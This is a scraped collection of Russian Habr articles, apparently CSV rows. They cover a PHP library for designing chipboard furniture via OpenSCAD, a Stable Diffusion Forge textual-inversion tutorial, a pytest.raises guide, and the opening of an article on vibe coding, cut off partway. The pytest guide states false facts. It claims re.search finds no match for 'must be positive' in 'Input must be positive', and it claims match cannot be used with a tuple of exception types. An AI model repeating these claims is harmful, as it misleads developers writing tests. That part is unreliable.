Чесалов А.Ю.  Генеративный искусственный интеллект #Forge&flux. Учебное пособие для школьников старших классов и студентов первых курсов вузов / А.Ю. Чесалов. – 1-е изд. – Москва: Ridero, 2024. – 338 с. – URL:  https://ridero.ru/books/generativnyi_iskusstvennyi_intellekt_forge_and_flux_1/  (дата обращения: 17.05.2025). – Текст: электронный. "
"Сказ о том, как один программист себе мебель из ДСП на PHP программировал",https://habr.com/ru/companies/ruvds/articles/904994/,"Тут немного о том, как я сделал библиотеку для проектировки простой мебели из ДСП не визуальным методом, а в виде PHP-скрипта.

В далёкой-далёкой галактике...

Точно уже не помню, когда именно это про...","Тут немного о том, как я сделал библиотеку для проектировки простой мебели из ДСП не визуальным методом, а в виде PHP-скрипта.

В далёкой-далёкой галактике...

Точно уже не помню, когда именно это произошло, но если и не 10 лет назад, то близко к этому. В какой-то момент я решил, что больше не хочу покупать себе готовую мебель из ДСП. Выбирать её слишком сложно, для этого должно сойтись очень много звёзд: она должна помещаться в квартире, но при этом быть не слишком маленькой, иметь необходимый функционал, внешний вид и цвет, а ещё вписываться в бюджет. И вот чтобы совпало всё — бывает крайне редко. Часто совпадает большая часть условий, в остальном приходится идти на компромисс. И я решил — доколе? Может и не всё, но что-то я могу сделать сам! Первые мои попытки были просты и примитивны — я просто покупал мебельные щиты и полки разных размеров в строительных магазинах и делал всё из них. Как правило, я даже ничего не проектировал, весь план был только у меня в голове. Я не заморачивался с кромками, поэтому старался приводить свои идеи к существующим размерам полок, чтобы если и требовались отрезы, то эти стороны не были бы видны снаружи. Какое-то время я делал этих квадратных несуразных Буратин, но постепенно я понял, что все мои идеи становятся заложниками этих существующих размеров полок, за которые нельзя было выходить, а вся мебель была топорно-квадратная, а иногда скругления смотрелись бы куда эстетичнее, и уже пора бы двигаться дальше. Двигаться в сторону проектирования мебели и заказа распилов тех размеров, которые мне были нужны. Отверстия для конфирмата я был в состоянии просверлить сам, а вот скругления и кромкование мне бы хотелось, чтобы было сделано за меня. Я стал искать программу для проектирования мебели и остановился на старенькой маленькой программке, которая называлась «Астра Конструктор Мебели». Но долго я на ней не задержался.

Путь к OpenSCAD

К этому времени у меня уже появился 3D-принтер, и я параллельно искал программу для проектирования моделей для него. Я перебирал множество программ для 3D-моделирования, но ни одна из них, в конечном счёте, так и не нашла во мне отклика. И вот я наткнулся на OpenSCAD. Идея рисовать 3D-модели с помощью кода показалась мне странной, но позже я осознал, что на самом деле мне это подходит больше. Я понял, что мне не нужно визуально что-то рисовать, достаточно того, чтобы я мог видеть результат. И поменять что-то в коде мне было гораздо проще, чем менять это визуально. Для себя я отметил следующие преимущества:

Программа маленькая и не требует установки.
Файлы текстовые и просто описывают геометрию, потому занимают мало места.
Сложно испортить такой файл — это же просто текст. И если я что-то такое наворотил, что модель начала безбожно тормозить и с ней уже ничего не сделать, я могу просто удалить любым редактором лишний текст — и всё снова станет нормально.

Я почти никогда не печатал художку — все эти игрушки, фигурки, фанатская дребедень, кажется, я уже слишком стар для этого дерьма. А печатал я разные детали взамен сломанных, крепления, дополнения к существующим вещам, улучшения, и, работая с этим, я понял, что главное — это размеры, всё начинается с них. Они есть у всего, у каждой части есть длина, ширина, высота и координаты — вокруг этого строится всё. И очень часто с размерами промахиваешься, и хочется быстро их поменять, чтобы при этом не поехала вся остальная деталь. Поэтому-то мне и полюбился OpenSCAD, где всё строится на цифрах. Я старался для всего заводить переменные и проектировать так, чтобы потом их легко было менять, и вся модель пересчитывалась на новые параметры и строилась правильно. И вот в какой-то момент, когда нужно было в очередной раз проектировать что-то из мебели, мне пришла в голову безумная идея:



Действительно, почему бы и нет? И я написал себе библиотеку для OpenSCAD для «упрощения» проектировки мебели, в которую добавлялись детали, чтобы потом экспортировать список для распила, но пошёл я не самым простым путём. Я заложил в её работу те же принципы, что и в обычное проектирование 3D-моделей. Нужно было создать ДСП-панель заданных размеров, поместить её на нужные координаты, с нужным поворотом. И хоть я и старался во всех вычислениях использовать переменные и не вставлять «magic numbers», но всё равно, порой, код получался слишком сложным. Для меня это стало общей проблемой OpenSCAD. Пока ты варишься в этом — всё просто. Но стоит оставить проект на пару месяцев, и если там нет подробнейших комментариев, ты понимаешь, что там не просто чёрт ногу сломит, а этот самый чёрт там переломался весь и погребён в этой каше кода так, что и не найдёшь. И вот тут я понял, что мне становится тесновато в OpenSCAD. Да, я видел, что ему есть альтернативы, такие как ZenSCAD, но Python, бррр.



Мне хотелось сделать что-то своё, удобное именно мне.

Пример кода в OpenSCAD. Без комментариев (и в том, и в том смысле)


PHP.SCAD

Прошло чуток времени, и я, наконец, понял, чего мне не хватало в OpenSCAD при создании 3D-моделей. Слоёв. Можно из одной фигуры вырезать другую, но иногда бывает, что мне нужно вырезать отверстие через большую часть модели, куда входит много различных элементов, и все они раскиданы по коду в файле. Всё это как-то нужно сгруппировать, чтобы сделать такой вырез, но специфика OpenSCAD такая, что это больше декларативный язык, нельзя создать модели, присвоить их переменным и потом провести действия над группой переменных. Там это немного сложнее, и каша кода от этого становится ещё наваристей. Было бы здорово, если бы я мог сказать, что вырезаю на слое 10, и это бы значило, что вырез будет через всё на слоях с 1 по 9, а на слои, начиная с 11 и выше вырез не распространяется. Но средствами OpenSCAD это было не сделать, вносить правки в сам OpenSCAD мне совершенно не хотелось, как и придумывать свой альтернативный язык программирования, чтобы сделать свой SCAD, этих языков и так развелось больше, чем хотелось бы. Поэтому я решил написать библиотеку для другого, существующего языка, которая реализует все нужные мне функции из OpenSCAD, добавляет то, чего мне не хватало, а на выходе будет генерировать файл формата OpenSCAD. И выбор мой пал на PHP. Вообще, PHP чаще используется для web-разработок, говорят даже, что он как рок, мёртв, но я не из тех, кто так быстро закапывает стюардесс, и я продолжаю его использовать для написания любых скриптов в системе. Почему всё-таки не Python? Он, казалось бы, сейчас более популярен. Не люблю я его, субъективно. Я привык к тому, что отступы — это просто форматирование текста, и мне не нравится идея того, что то, как будут стоять отступы в коде, будет как-то влиять на работу самой программы. И хоть иногда и приходится на нём что-то писать, делал я это всегда без любви и удовольствия. Поэтому я выбрал PHP. Чтобы работа была удобнее, я настроил VSCode так, чтобы по F5 он выполнял мой скрипт, который в свою очередь при выполнении обновляет SCAD-файл, а OpenSCAD довольно умный, и когда он видит, что файл изменился даже извне, он моментально его перезагружает и обновляет картинку. Поэтому работать удобно, F5 — и ты сразу видишь, что наворотил.


Настройка VSCode













Не скажу, что это решило проблему каши в коде, но сильно всё упростило и принесло мне нормальную работу переменных и функций (кто не знает, как это работает в OpenSCAD, то скажу так, специфически). Но я эту поделку никуда не выкладывал, и описываю её только как промежуточный шаг на пути к тому, что было дальше.

PHP.MEBEL.SCAD :)

Что? Mebel? Серьёзно? Да. Я знаю, что по-английски это будет furniture, но в русском языке есть слово фурнитура и у него немного другое значение, не хотелось путаницы, поэтому долго я не думал:



Но прежде чем сделать эту библиотеку, я решил переосмыслить саму концепцию проектирования мебели кодом. Мне не хотелось повторять то, что было сделано в виде библиотеки для OpenSCAD, где надо было размещать каждую доску, задавая ей смещения по 3м осям и углы поворота. Это всё громоздко и не слишком удобно и трудно читаемо в будущем. Я хотел чего-то нового. И в этом случае у нас есть два пути:

Изучить то, что уже сделано в этом направлении, и адаптировать под свои нужды.
Ничего не изучать и сразу начать изобретать свой велосипед.

А что тут думать? Конечно же, второй пункт! Ещё чего-то изучать я буду, делать мне больше нечего! Но если серьёзно, то в этом есть свои плюсы и минусы. Минусы в том, что я могу «изобрести» то, что уже давным-давно изобретено до меня, причём изобрести не в лучшем виде. Или изобрести что-то мертворождённое, что не приведёт меня ни к чему, кроме понимания того, что эта идея была плохая. Но плюсы в том, что так я думаю сам, и это иногда приводит к хорошим оригинальным решениям. Если я посмотрю, как сделали другие, мне будет гораздо сложнее потом придумать что-то своё, кардинально от этого отличающееся. Мозг зацепляется за протоптанную тропинку и не хочет топтать новую. Поэтому я ничего не изучал, да и вообще, не думаю, что в мире есть еще хоть один псих, который решит проектировать мебель PHP-скриптом. А если он есть, я бы предпочёл держаться от него подальше, мало ли что ему ещё в голову взбредёт? И вот я просто ходил и думал. И что-то придумал. Квадрат! Точнее, нет — куб. Всё — куб. А еще точнее, всё — параллелепипед. И немного из HTML/CSS разметки. Так, наверное это надо как-то объяснить) Сейчас попробую, итак, в отличие от произвольных 3D-моделей, мебель из ДСП в 99% случаев строится по одному принципу: панель ложится либо горизонтально, либо вертикально, без хитрых углов и причудливых форм, она сама параллелепипед и стыкуется с другими параллелепипедами. И в результате образуется другой большой параллелепипед (один или много). Сейчас покажу наглядно, и станет понятно о чём я и что у меня вышло.

Итак, сначала был размер.

Всё всегда начинается с размера, место в которое нужно эту мебель поставить, и оно ограничено. (Сразу буду писать на PHP.MEBEL.SCAD и визуализировать)

И создал я пространство!

require_once ""scad.mebel.php"";
$box = box(500, 800, 600);
draw_box($box);
render_scad();



Вот он, этот параллелепипед гражданской наружности шириной 500мм, высотой 800мм, глубиной 600мм. Я сразу решил оперировать не x,y,z, а более человеческими — ширина (h, он же horizontal), высота (v, он же vertical) и глубина (d, он же depth). Дальше я совместил трёхмерное пространство и принцип html/css разметки, когда у нас есть div фиксированного размера, у которого есть border или padding, который его уменьшает и дочерние элементы остаются уже в меньшем прямоугольнике.

Далее создал я полку сверху и понял, что не плохо это:

require_once ""scad.mebel.php"";
$box = box(500, 800, 600);
$box = wall_top($box, ""Мебель: %W"");
render_scad();



Панель примагнитилась к верхней грани параллелепипеда, а сам параллелепипед уменьшился на толщину этой панели. Нам не нужно указывать размеры панели, мы только указываем сторону параллелепипеда, размеры она возьмёт по размеру прямоугольника этой стороны (ну ладно, мы можем задать padding или размер для панели, но это не обязательно).

И создал я вторую полку снизу, и понравилось это мне:

require_once ""scad.mebel.php"";
$box = box(500, 800, 600);
$box = wall_top($box, ""Мебель: %W"");
$box = wall_bottom($box, ""Мебель: %W"");
render_scad();


Теперь то же самое произошло снизу, параллелепипед уменьшается, создавая каркас будущего изделия.

И создал я стенки боковые, как опоры меж полок горизонтальных:


require_once ""scad.mebel.php"";
$box = box(500, 800, 600);
$box = wall_top($box, ""Мебель: %W"");
$box = wall_bottom($box, ""Мебель: %W"");
$box = wall_left($box, ""Мебель: %W"");
$box = wall_right($box, ""Мебель: %W"");
render_scad();



И вот наша коробка. Обращаю внимание, что верхняя и нижняя панели зашли над боковыми, потому что мы нарисовали их первыми, и боковые уже рисовались в уменьшенном параллелепипеде.



Но если поменять местами порядок создания стенок, то будет так:

require_once ""scad.mebel.php"";
$box = box(500, 800, 600);
$box = wall_left($box, ""Мебель: %W"");
$box = wall_right($box, ""Мебель: %W"");
$box = wall_top($box, ""Мебель: %W"");
$box = wall_bottom($box, ""Мебель: %W"");
render_scad();



И разбил я пространство оставшееся на несколько частей равных:

require_once ""scad.mebel.php"";
$box = box(500, 800, 600);
$box = wall_top($box, ""Мебель: %W"");
$box = wall_bottom($box, ""Мебель: %W"");
$box = padding($box, ""front=16"");
$box = wall_left($box, ""Мебель: %W"");
$box = wall_right($box, ""Мебель: %W"");
$box = wall_back($box, ""Мебель: %W"");
$boxes = split_vertical($box, ""*,*,*,*,*"", 16);
foreach ($boxes as $b) {
    if (is_part($b)) {
        draw_box($b);
    }
}
render_scad();


Здесь они разбиты на равные интервалы с пропуском в 16 см, это не случайно, а чтобы при сборке ящиков класть между ними обрезок ДСП, и так их будет не нужно выравнивать. Разбиение задано ""*,*,*,*,*"", но можно вместо * задавать либо % от всего пространства, либо размеры в мм. Сначала вычисляются все фиксированные значения, а оставшееся пространство делится между *.

И закрыл я каждую из полученных частей каркасом деревянным:

require_once ""scad.mebel.php"";
$box = box(500, 800, 600);
$box = wall_top($box, ""Мебель: %W"");
$box = wall_bottom($box, ""Мебель: %W"");
$box = wall_left($box, ""Мебель: %W"");
$box = wall_right($box, ""Мебель: %W"");
$box = wall_back($box, ""Мебель: %W"");
$boxes = split_vertical($box, ""*,*,*,*,*"", 16);
foreach ($boxes as $b) {
    if (is_part($b)) {
        $b = padding($b, ""left=10,right=10,back=5"");
        $b = wall_front($b, ""Ящик: %W"");
        $b = wall_bottom($b, ""Ящик: %W"");
        $b = wall_back($b, ""Ящик: %W"");
        $b = wall_left($b, ""Ящик: %W"");
        $b = wall_right($b, ""Ящик: %W"");
    }
}
render_scad();



И нарёк я тумбою изделие своё, но сперва облагородил её незначительно:

require_once ""scad.mebel.php"";
$box = box(500, 800, 600);
$box[""closed""][""b""] = true;
$box = wall_top($box, ""Мебель: %W"");
$box = wall_bottom($box, ""Мебель: %W"");
$box = padding($box, ""front=16"");
$box = wall_left($box, ""Мебель: %W"");
$box = wall_right($box, ""Мебель: %W"");
$box = wall_back($box, ""Мебель: %W"");
$box = padding($box, ""top=10,bottom=10"");
$boxes = split_vertical($box, ""*,*,*,*,*"", 16);
foreach ($boxes as $b) {
    if (is_part($b)) {
        wall_front($b, ""door=1,edge=f"", ""Ящик: %W"", ""front=-16,left=-16,right=-16,top=-6,bottom=-6"");
        $b = padding($b, ""left=10,right=10,back=5"");
        $b = wall_front($b, ""Ящик: %W"");
        $b = wall_bottom($b, ""Ящик: %W"");
        $b = wall_back($b, ""Ящик: %W"");
        $b = wall_left($b, ""Ящик: %W"");
        $b = wall_right($b, ""Ящик: %W"");
    }
}
render_scad();



Вот так просто мы создали тумбочку. И именно этот принцип проектирования пришёл мне в голову. Мы не работаем со стенками по отдельности, мы всегда работаем с параллелепипедом. Мы можем сами резать его на несколько параллелепипедов, уменьшать или увеличивать. А потом заполнять нужные нам стенки панелями. И нам не нужно держать кучу цифр в голове, какого размера будет эта панель, как её повернуть. Всё будет сделано за нас. Также библиотека пытается предугадать, где нужна кромка, а где нет. Иногда она ошибается, но мы можем ей помочь сделать вручную. Все края, на которых нет кромок, специально показываются красным цветом, чтобы сразу было видно, где косяк:



Если мы хотим посмотреть картинку в разрезе, добавим команду:

view_cut_front(400);

И рассёк я пространство, чтобы все могли лицезреть срез творения моего


И вот она в разрезе (OpenSCAD не всегда правильно отображает такие разрезы в реальном времени, но после рендеринга (F6) всё становится как надо, а рендеринг тут почти мгновенный).

Добавив строчку
render_parts_list();

мы получим рядом с нашим файлом с кодом csv-файл с частями для распила:



Но это всё баловство, давайте посмотрим на реальные проекты, которые я не только нарисовал, но и собрал.

Реальные проекты

▍ Стол-стеллаж

Идея была в том, что над столом часто пропадает пространство, а можно сделать там стеллаж, и оно будет использоваться с пользой.

Код
















































Рендер:


В жизни (требует обязательного крепления верхней части к стене):


▍ Франкенштейн из стола-стеллажа

Продолжение стола-стеллажа, сделано место под компьютер и сзади отступ на 10 см, чтобы там пустить все провода и закрыть это крышкой внизу.

Код























































































Рендер:





В жизни (требует обязательного крепления верхней части к стене):



▍ Стол на кухню

Основная мысль была в том, чтобы за ним можно было нормально сидеть с любой из трёх сторон, и ноги не упирались ни во что, а табуретки убирались под него и получалось компактнее кухонных уголков.

Код

































Рендер:


В жизни:







И резюмирую

Если вдруг вам захотелось делать мебель также безумно, как это делаю я, вот что нужно:

OpenSCAD — рекомендую не стабильный билд, а найтли, он намного быстрее.
PHP — я использую 7.2.
Любой редактор, я использую VSCode с плагином для PHP, а также плагин F5 Anything, чтобы по F5 выполнять скрипт. Он создаёт файл с таким же названием и расширением .scad. Его надо открыть в OpenSCAD. Каждый раз, когда будете нажимать F5 в VSCode, он будет видеть, что scad файл изменился и сразу же отображать изменения.
Сама библиотека и документация всех функций: https://github.com/CodeName33/php.mebel.scad

Ну и как обычно всё MIT, делайте с этим чего хотите.

© 2025 ООО «МТ ФИНАНС»

Telegram-канал со скидками, розыгрышами призов и новостями IT 💻"
Stable Diffusion WebUI Forge: Шаг 10. Текстовая инверсия,https://habr.com/ru/articles/910268/,"Текстовая инверсия (Textual Inversion) – это метод, который позволяет добавлять новые объекты или стили к имеющейся у нас модели. Файлы текстовой инверсии с объектами обычно имеют небольшой размер с р...","Текстовая инверсия (Textual Inversion) – это метод, который позволяет добавлять новые объекты или стили к имеющейся у нас модели. Файлы текстовой инверсии с объектами обычно имеют небольшой размер с расширением .pt или .safetensors. По сути, эти файлы являются дополнительными модулями для Stable Diffusion WebUI Forge и используемой нами модели FLUX.1 (например, flux1-dev-bnb-nf4-v2.safetensors), которые отображаются на закладке Txt2img / Textual Inversion.
Другими словами, текстовая инверсия очень быстро и без особых усилий может нам помочь персонализировать создаваемое изображение.
Например, представьте себе, что вам нужно создать изображение с Герольдом – главным героем игры «Ведьмак 3». Но не просто изображение, а чтобы его лицо было похоже на известного киноактера Генри Кавилла.
Что же нам нужно для этого сделать?
Первое, конечно, нужно скачать файлы с сайта civitai.com.
Переходим на сайт. Выбираем раздел модели (Models), затем фильтры (Filters).
И вот какой «сюрприз» нас ожидает…
На сайте нет необходимых нам файлов, совместимых с моделью FLUX.1.
Но! Расстраиваться не нужно.
Все дело в том, что, когда вы купите эту книгу, скорее всего, нужные файлы будут присутствовать на сайте. Поэтом я покажу вам, что делать дальше на примере, но с моделью Stable Diffusion 1.5. А также вы увидите существенную разницу в качестве работы двух моделей.
Для этого на сайте civitai.com мы в фильтре указываем не FLUX.1 D, а SD 1.5 или сразу находим страницу «Henry Cavill Textual Inversion Ultimate 15k» и файл текстовой инверсии. Ссылка для скачивания файла.
Обратите внимание на то, что на странице разработчик указывает, какие конкретно ключевые фразы (или триггеры) позволят активировать этот файл. В данном случае это два слова: «hnrycvllti» и «Henry Cavill».
После того как вы скачали файлы (не забудьте скачать пример картинки со страницы, которую нужно будет переименовать в соответствии с именем файла текстовой инверсии), их необходимо скопировать в папку «embeddings», которая у меня находится по следующему пути: D:\Stable Diffusion WebUI Forge\webui\embeddings.
Для того чтобы понять, как все это работает, давайте сначала создадим изображение с «обычным» ведьмаком:
Пишем «правильный» запрос: «medieval knight in metal armor, man with handsome face, blue eyes, gray long hair».
Выберем модель FLUX, с которой будем работать (flux1-schnell-bnb-nf4-v2.safetensors).
Sampling method: [Forge] Flux Realistic.
Устанавливаем минимальное разрешение изображения. Например, 512 × 512 (Width: 512; Height: 512);
FreeU Integrated (SD 1.x, SD 2.x, SDXL): ставим галочку и оставляем параметры по умолчанию.
PerturbedAttentionGuidance Integrated: ставим галочку и оставляем параметры по умолчанию.
Генерируем изображение.
Получился вот такой ведьмак:
Теперь нам нужно, чтобы у нас вышел ведьмак с лицом киноактера Генри Кавилла. Для этого нам нужно в нашем запросе добавить ключевые слова, которые нам позволят указать Stable Diffusion WebUI Forge и другой модели Stable Diffusion 1.5, что мы хотим воспользоваться соответствующим файлом из закладки Txt2img / Textual Inversion.
Модель Stable Diffusion 1.5 можно скачать по следующей ссылке: https://huggingface.co/pt-sk/stable-diffusion-1.5/blob/main/v1-5-pruned.safetensors.
Для этого в наш запрос вписываем ключевые слова, которые указал на сайте разработчик: «hnrycvllti, medieval knight in metal armor, Henry Cavill with handsome face, blue eyes, gray long hair», а также:
·         Выберем модель, с которой будем работать – Stable Diffusion 1.5.
·         Sampling method: Euler.
·         Устанавливаем минимальное разрешение изображения. Например, 512 × 512 (Width: 512; Height: 512).
·         FreeU Integrated (SD 1.x, SD 2.x, SDXL): ставим галочку и оставляем параметры по умолчанию.
·         PerturbedAttentionGuidance Integrated): ставим галочку и оставляем параметры по умолчанию.
·         Генерируем изображение.
Получается вот такой ведьмак:
Да, мягко говоря, модель Stable Diffusion 1.5 очень слабая и, конечно, устаревшая. Но в данном случае это не важно. Важно другое: она позволила нам увидеть , что такое «текстовая инверсия» в действии.
Какие выводы можно сделать из этого урока:
1.      Модель FLUX новая, и для нее сделано не так много вспомогательных моделей, которые бы существенно расширили ее функциональные возможности. Но это не страшно, так как FLUX и без расширений великолепно справляется со своими задачами.
2.      Stable Diffusion WebUI Forge – это отличная программа, в которую уже заложена возможность применения текстовой инверсии. Со временем расширений для программы будет очень много.
3.      Данный урок вам будет полезен хотя бы потому, что вы теперь знаете, как пользоваться текстовой инверсией.
4.      По моему мнению, текстовая инверсия меньше нагружает оборудование и работает очень быстро, но польза от нее сомнительная. Лучше воспользоваться LoRA. Например, для персонажа ведьмака Герольда она есть. Скачать файл модели можно по следующей ссылке: https://civitai.com/models/685562/henry-cavill-as-geralt-of-rivia-the-witcher (не забывайте про ключевые слова на странице разработчика). 
Я установил эту модель и поправил старый запрос (добавил вызов модели LoRa и ключевые слова): «<lora:Henry_Cavill_g3ral7:1>, medieval knight in metal armor, man with handsome face, blue eyes, gray long hair, g3ral7, leather armor, heavy leather armor, silver wolf pendant», а также:
Выберем модель FLUX, с которой будем работать (flux1-schnell-bnb-nf4-v2.safetensors).
Sampling method: [Forge] Flux Realistic.
Устанавливаем минимальное разрешение изображения. Например, 512 × 512 (Width: 512; Height: 512).
FreeU Integrated (SD 1.x, SD 2.x, SDXL): ставим галочку и оставляем параметры по умолчанию.
PerturbedAttentionGuidance Integrated): ставим галочку и оставляем параметры по умолчанию.
Генерируем изображение.
Получился вот такой замечательный ведьмак:
***
Чесалов А.Ю.  Генеративный искусственный интеллект #Forge&flux. Учебное пособие для школьников старших классов и студентов первых курсов вузов / А.Ю. Чесалов. – 1-е изд. – Москва: Ridero, 2024. – 338 с. – URL:  https://ridero.ru/books/generativnyi_iskusstvennyi_intellekt_forge_and_flux_1/  (дата обращения: 17.05.2025). – Текст: электронный. "
pytest.raises: ловим исключения правильно,https://habr.com/ru/companies/otus/articles/901858/,"Привет, Хабр!
Сегодня говорим о pytest.raises. Не о его наличии в экосистеме — это известно каждому, кто хоть раз писал тесты. Говорим о правильном использовании. Потому что между «тест проходит» и «т...","Привет, Хабр!
Сегодня говорим о pytest.raises. Не о его наличии в экосистеме — это известно каждому, кто хоть раз писал тесты. Говорим о правильном использовании. Потому что между «тест проходит» и «тест действительно что‑то проверяет» — пропасть.
Контекст и ожидание: что делает pytest.raises?
Тест — это не просто проверка результата. Это формулировка ожидания. Мы говорим системе: вот этот участок кода, и вот что мы считаем его корректным поведением. И если функция должна выбросить исключение — мы обязаны это зафиксировать в тесте как норму, а не как сбой.
pytest.raises является той конструкцией, которой мы говорим: вот сейчас должно случиться исключение — и это хорошо. Пример:
with pytest.raises(MyError):
    print(broken_object)  # здесь ломается __str__
    perform_action()
На языке ожиданий это звучит так: «Я заранее знаю, что func() завершится аварийно, и считаю это нормальным исходом. Более того — если этого не произойдёт, значит, код работает неправильно».
И это не ловушка, не try/except, не защита от фатала. Это — осознанная декларация ошибки как части правильного поведения.
Что делает pytest.raises? В момент входа в with он ставит ловушку на все исключения в теле блока. Если в процессе исполнения возникает исключение нужного типа — тест проходит. Если исключения нет, или оно другого типа — тест падает. Но есть нюанс: pytest при этом не перехватывает исключение молча, он сохраняет его в специальный объект, доступный для анализа.
Т.е pytest.raises — это не просто способ словить ошибку. Это формальный способ описать, что ошибка — ожидаема и контролируема, и при этом — доступ к деталям этой ошибки: текст, тип, поля, stack trace.
Первый миф: исключение будет поймано — и это всегда хорошо?
Да, pytest.raises действительно ловит исключение, если оно случилось внутри блока with. Это и есть его назначение. Но важно понять что именно он ловит.
Он ловит любое исключение указанного типа, которое произойдёт внутри блока. А внутри может быть не только вызов вашей функции, но и любой другой побочный эффект: логирование, печать, f‑строка, даже попытка отрисовать объект в консоли.
Посмотрим на пример:
def perform_action():
    pass  # ничего не делает, никаких исключений

def test_broken_str():
    class Broken:
        def __str__(self):
            raise MyError(""String rendering failed"")

    broken_obj = Broken()

    with pytest.raises(MyError):
        print(f""About to act on: {broken_obj}"")  # ← исключение тут
        perform_action()
На первый взгляд, вы тестируете, что perform_action() вызывает MyError. Но в реальности исключение происходит на этапе форматирования строки. Тест пройдёт — хотя ваша функция ни при чём.
Это называется ложноположительный результат: pytest доволен, но ошибка — в другом месте. И в продакшене это может означать, что вы проглотили баг и просто его не заметили.
Всегда изолируйте вызов, от которого вы реально ожидаете исключение:
# правильный вариант
broken_obj = Broken()
print(""About to act on: object prepared"")

with pytest.raises(MyError):
    perform_action()
Идея простая: в блоке with должен быть только тот вызов, исключение из которого вы считаете допустимым. Всё остальное — за пределами with.
Второй миф: match — это подстрока. На деле — регулярное выражение
Многие используют match, думая, что он проверяет: «содержится ли строка А в сообщении ошибки?» Увы — нет. match передаётся в re.search(), а значит, это полноценное регулярное выражение.
Простой пример:
with pytest.raises(ValueError, match=""must be positive""):
    raise ValueError(""Input must be positive"")
Этот тест упадёт, потому что re.search(""must be positive"", ""Input must be positive"") вернёт None. Почему? Потому что match проверяет совпадение с шаблоном, а не подстроку.
Теперь пример, где всё ломается из‑за спецсимвола:
with pytest.raises(ValueError, match=""1 + 1 = 2""):
    raise ValueError(""1 + 1 = 2"")
Тест упадёт. Потому что + в регулярке означает «один или более символов перед ним». В нашем случае — это не то, что мы хотим.
Решения
1. Использовать «сырую» строку (r""..."") с экранированием:
with pytest.raises(ValueError, match=r""1 \+ 1 = 2""):
    ...
2. Или — безопасный путь — воспользоваться re.escape, особенно если текст ошибки получен динамически:
import re

msg = ""1 + 1 = 2""
with pytest.raises(ValueError, match=re.escape(msg)):
    raise ValueError(msg)
Если используете match — относитесь к нему как к re.search(), а не in.
Проверка содержания исключения: as exc_info
Иногда само наличие исключения — не достаточно. Нужно проверить, что именно оно содержит. Это особенно важно при тестировании бизнес‑логики, кастомных исключений, сериализаторов и API.
Представим кастомную ошибку:
class ValidationError(Exception):
    def __init__(self, code: int, message: str):
        self.code = code
        super().__init__(message)
Если система выбрасывает такую ошибку, хочется проверить не только текст, но и поле code.
Вот так делать нельзя:
with pytest.raises(ValidationError):
    raise ValidationError(400, ""Bad request"")
Потому что вы не проверили, какая ошибка. А если кто то случайно поменяет код на 500, тест всё равно пройдёт.
Правильный способ:
with pytest.raises(ValidationError) as exc_info:
    raise ValidationError(400, ""Bad request"")

assert exc_info.value.code == 400
assert str(exc_info.value) == ""Bad request""
Через exc_info.value есть полный доступ к экземпляру исключения. Это важно, если внутри ошибки есть:
HTTP‑статус,
список полей с ошибками,
коды локализации и т. д.
Опасный соблазн: ловить Exception и BaseException
В начале — удобно. Написал:
with pytest.raises(Exception):
    call()
И тест проходит. Но так можно пропустить всё, что угодно. Exception включает в себя:
ValueError,
TypeError,
RuntimeError,
AssertionError (что опасно в тестах — можно случайно поймать ошибку из assert).
Ещё хуже:
with pytest.raises(BaseException):
    ...
Теперь ловим даже:
KeyboardInterrupt (нажатие Ctrl+C),
SystemExit (например, при вызове sys.exit()),
GeneratorExit.
Так делать категорически нельзя. Это уже не тестирование, а ловля всего подряд.
Всегда явно указывайте тот тип, который ожидаете. Не шире, чем надо.
Несколько исключений: можно, но осторожно
Иногда поведение функции зависит от контекста, и она может выбросить одну из нескольких ошибок. В таких случаях разрешено писать:
with pytest.raises((ValueError, TypeError)):
    process_input(data)
Такой код корректен: pytest проверит, что хотя бы один из типов сработал. Но у этого есть ограничения.
Если вы одновременно передаёте match, то pytest не сможет точно понять, к какому из исключений применять шаблон. И вы получите ошибку.
Альтернатива: разнесите проверки
def test_type_error():
    with pytest.raises(TypeError, match=""expected string""):
        ...

def test_value_error():
    with pytest.raises(ValueError, match=""cannot be negative""):
        ...
Так тесты:
понятнее,
точнее локализуют проблему,
не мешают друг другу.
pytest.raises как функция
Чаще всего pytest.raises применяют в контексте:
with pytest.raises(SomeError):
    call()
Но можно использовать его как функцию — особенно если тестируется компактный вызов.
exc_info = pytest.raises(ValueError, lambda: int(""abc""))
assert ""invalid literal"" in str(exc_info.value)
Или с аргументами:
def parse_int(x):
    return int(x)

exc_info = pytest.raises(ValueError, parse_int, ""abc"")
assert ""invalid"" in str(exc_info.value)
Это удобно для однострочных функций, но у этого способа есть ограничения:
вы не можете явно контролировать, где в коде возникло исключение;
вы не можете использовать as для доступа к stack trace и context.
Поэтому в большинстве случаев контекстный менеджер — предпочтительнее. Он:
ограничивает зону ловли;
даёт читаемость;
даёт больше контроля.
Напоследок: чек-лист для безопасного использования pytest.raises
№
Рекомендация
1
Используйте узкие блоки with — только вызов функции
2
Проверяйте не только тип, но и текст ошибки через match
3
Не ловите Exception — это может скрыть реальные ошибки
4
Не используйте match как подстроку — это полноценное регулярное выражение
5
Обрабатывайте исключение через as exc_info, если нужно проверить поля
6
Делайте отдельные тесты на разные исключения — это повышает читаемость
7
Не используйте pytest.raises, если вызов происходит по условию — применяйте pytest.skip()
Используйте pytest.raises грамотно — и ваши тесты будут не просто зелёными, но надёжными.
Чтобы повысить уровень тестирования и исключить ошибки на всех этапах разработки, рекомендую вам обратить внимание на несколько практических уроков. Они помогут улучшить навыки работы с исключениями, тестированием и интеграцией систем:
21 мая
Интеграционные тесты на Go
22 мая
Тестирование кода на Python: лучшие практики для продвинутых разработчиков
29 мая
API-тестирование: оптимальные библиотеки для вашего проекта"
Vibe Coding и сравнительный анализ его инструментов,https://habr.com/ru/articles/910250/,"1. Введение и методология

Vibe coding - это современный подход к разработке программного обеспечения, в основе которого лежит использование искусственного интеллекта для автоматизации процесса написа...","1. Введение и методология

Vibe coding - это современный подход к разработке программного обеспечения, в основе которого лежит использование искусственного интеллекта для автоматизации процесса написания кода. Благодаря этому методу создавать приложения и различные программные решения могут не только профессиональные разработчики, но и люди без специальной технической подготовки. Всё, что требуется - описать свою идею на естественном языке, а система на основе ИИ преобразует её в работающий программный продукт.
Вайб-кодинг - это не простой навык, как о нем думает большинство. На его освоение может быть разумно выделить столько же времени, сколько на изучение нового языка программирования. Однако время, вложенное в его изучение, окупится в десятки раз.
Ключевые характеристики vibe-coding:
Программисты ""доверяются вайбу"" и позволяют ИИ выполнять большую часть процесса написания кода
Разработчики описывают задачи и требования человеческим языком
Нейросети автоматически создают код, исправляют ошибки и реализуют необходимые функции
Разработчики часто принимают код без полного понимания всех деталей его работы
